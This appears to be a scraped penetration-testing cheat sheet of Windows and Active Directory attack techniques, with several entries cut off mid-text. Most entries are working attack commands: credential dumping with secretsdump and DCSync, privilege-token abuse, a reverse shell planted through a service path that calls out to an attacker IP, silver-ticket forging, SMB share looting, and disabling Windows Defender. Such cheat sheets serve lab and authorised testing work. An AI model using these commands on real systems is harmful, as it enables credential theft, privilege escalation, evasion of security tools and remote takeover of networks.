tds.dit C:\ProgramData
tds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData	est.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.

item.title: secretsdump
item.description: Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump <USER>:<PASSWORD>@<TARGET> nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds

item.title: Secure String
item.description: Decrypt secure string Windows $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss $cred.GetNetworkCredential().password

item.title: SeDebugPrivilege
item.description: Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate <PID> # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>" Ref: psgetsys

item.title: SeImpresonate
item.description: Abuse #1: Recover SeImpresonate .\FullPowers.exe -c "whoami /priv" # Revshell .\FullPowers.exe -c "<powershell #3 Base64>" Ref: FullPower Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege" # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.

item.title: SeLoadDriverPrivilege
item.description: Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include "stdafx.h"` | | 7. Release -> x64 | | 8. Build -> Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.

item.title: Server Operators
item.description: Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto

item.title: Silver Ticket
item.description: Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC> -request -k # If NTLM auth is disabled sudo ntpdate -s <DC> && impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-host <DC> -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE <(printf "<PASSWORD>") | openssl dgst -md4 3. Get domain SID sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator <DOMAIN>/<USER>:<PASSWORD> 4. Generate Silver Ticket impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator 5.

item.title: SMB Enum
item.description: SMB Share Enum nmap sudo nmap --script=smb-enum-shares -p 445 <TARGET> Anonymous Login smbmap smbclient impacket smbmap -H <TARGET> --no-banner smbmap -H <TARGET> -u null --no-banner # List known share smbmap -H <TARGET> -r <SHARE> smbclient -N -L \\\\<TARGET>\\ # After found an accessible share smbclient -N \\\\<TARGET>\\<SHARE>\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\<TARGET>\\ --option='client min protocol=NT1' # SID brute, if null auth allowed impacket-lookupsid test@<DOMAIN> -no-pass Authenticated smbmap smbclient smbmap -H <TARGET> -u <USER> -p <PASSWORD> # List known share smbmap -H <TARGET> -u <USER> -p <PASSWORD> -R <SHARE> # Download file smbmap -H <TARGET> -r <SHARE> --download <PATH/TO/FILE> # List files with regex pattern smbmap -H <TARGET> -u <USER> -p <PASSWORD> -r <SHARE> -A <FILE_PATTERN> smbclient -L \\\\<TARGET>\\ -U <DOMAIN>/<USER>%<PASSWORD> # After found an accessible share smbclient \\\\<TARGET>\\<SHARE>\\ -U <DOMAIN>/<USER>%<PASSWORD> Authenticated with Kerberos impacket impacket-smbclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN> -k -no-pass Basic commands # List all files in a share recurse ON ls # Download all files mask "" recurse ON prompt OFF mget * List Alternate Data Streams (ADS) allinfo <FILE> # Example Response >>>stream: [:Password:$DATA], 15 bytes # Download specific data stream get "<FILE>:Password" Mount SMB Share Anonymous Authenticated sudo mount -t cifs //<TARGET>/<SHARE> /mnt sudo mount -t cifs -o ro,user=<USER>,password=<PASSWORD> //<TARGET>/<SHARE> /mnt Check write permission sudo find .

item.title: SMB Server
item.description: Start a SMB Server for File Transfer Anonymous Authenticate Older Windows impacket-smbserver share . -smb2support impacket-smbserver share . -smb2support -username <USER> -password <PASSWORD> Note: Sometimes smb server with creds may not work impacket-smbserver share .

item.title: Volume Shadow Copies
item.description: Abuse #1: Recover data from shadow copies Windows 1. Check vssadmin list shadows 2. Create symlink and expose the volume cmd /c mklink /d C:\VSS <SHADOW_COPY_VOLUME_PATH> 3. Access ls C:\VSS\Users

item.title: Windows ACLs
item.description: Window ACLs (Access Control Lists) Check ACLs powershell # Check a file/directory icacls <PATH> # Check all files and directories icacls * /C Grant user full control cmd powershell # cmd cmd.exe /c cacls <FILE> /E /G <USER>:F # powershell icacls <FILE> /grant <USER>:F Change owner (WO) cmd # cmd cmd.exe /c takeown /F <FILE> ACLs +---------------------------------------------------+ | F (full access) | | M (modify access) | | RX (read and execute access) | | R (read-only access) | | W (write-only access) | | D (delete) | | RC (read control) | | WDAC (write DAC) | | WO (write owner) | | S (synchronize) | | AS (access system security) | | MA (maximum allowed) | | GR (generic read) | | GW (generic write) | | GE (generic execute) | | GA (generic all) | | RD (read data/list directory) | | WD (write data/add file) | | AD (append data/add subdirectory) | | REA (read extended attributes) | | WEA (write extended attributes) | | X (execute/traverse) | | DC (delete child) | | RA (read attributes) | | WA (write attributes) | | OI (object inherit) | | CI (container inherit) | | IO (inherit only) | | NP (do not propagate inherit) | | I (permission inherited from parent container) | +---------------------------------------------------+

item.title: Windows Defender
item.description: Disable defender Powershell # Disable realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Completely disable defender New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

item.title: Windows Event Logs
item.description: Convert evtx to json evtx_dump ./evtx_dump -o jsonl -t 1 -f Security.json Security.evtx Ref: evtx_dump Check number of logs wc -l Security.json Security Check computer name cat Security.json | jq '.Event.System.Computer' -r | sort | uniq -c | sort -nr Overview of event logs cat Security.json | jq '.Event.System.EventID' | sort | uniq -c | sort -nr Check specific event cat Security.json | jq 'select(.Event.System.EventID==4624)'

item.title: Windows RPC
item.description: Windows RPC impacket IOXIDResolver # Show mappings impacket-rpcmap 'ncacn_ip_tcp:<TARGET>' # Get network interface without auth python3 IOXIDResolver.py -t <TARGET> Ref: IOXIDResolver

item.title: Winrm from Windows VM
item.description: Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client 2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center' | | 2. Click 'Local Area Connection' | | 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' | | 4. Under 'General', check 'Obtain an IP address automatically' | | 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP> | +-----------------------------------------------------------------------------------+ 3.

item.title: WriteDacl
item.description: Abuse #1: Add dcsync right to user Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump <USER>:<PASSWORD>@<TARGET>

item.title: WriteOwner/Own
item.description: Abuse #1 : Change owner of the group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER> Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add domain object sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers 2. Add group member kinit <USER> sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass 3.
